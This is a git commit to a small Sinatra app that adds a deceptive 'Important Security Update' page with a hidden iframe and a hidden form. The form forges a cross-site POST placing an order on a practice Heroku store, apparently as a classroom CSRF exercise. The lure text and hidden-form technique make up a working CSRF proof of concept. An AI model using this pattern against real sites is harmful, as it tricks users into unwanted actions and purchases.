e5984a94bc0831c447b0a92ae212974ccaee2510
ichthala <alice.mottola@gmail.com>
2015-01-03 22:14:32 -0500

    adds CSRF form

--- main.rb
+++ main.rb
@@ -1,5 +1,18 @@
 require 'sinatra'
 
 get '/' do
-  "Hello, world"
+  'Welcome to the Important Security Update Homepage!!!! Do you want to receive Important Security Updates?
+  Click the button to agree!
+  <iframe style="width: 0px; height: 0px; visibility: hidden" name="hidden"></iframe>
+  <form name="csrf" action="http://rubazzle-exercise.herokuapp.com/orders" method="POST" enctype="application/json" target="hidden">
+  <input type="hidden" name="order[product]" value="Super Rubazzle Case"/>
+  <input type="hidden" name="order[quantity]" value=1/>
+  <input type="hidden" name="order[price]" value=16.50/>
+  <input type="hidden" name="order[cc]" value="3333444455556666"/>
+  <input type="hidden" name="order[cvv]" value="777"/>
+  <input type="hidden" name="order[expiration]" value="07/20"/>
+  <input type="hidden" name="order[first_name]" value="This order came from "/>
+  <input type="hidden" name="order[last_name]" value="a CSRF attack!!!"/>
+  <input type="submit" value="Yes! I want to receive important security updates!"/>
+  </form>'
 end
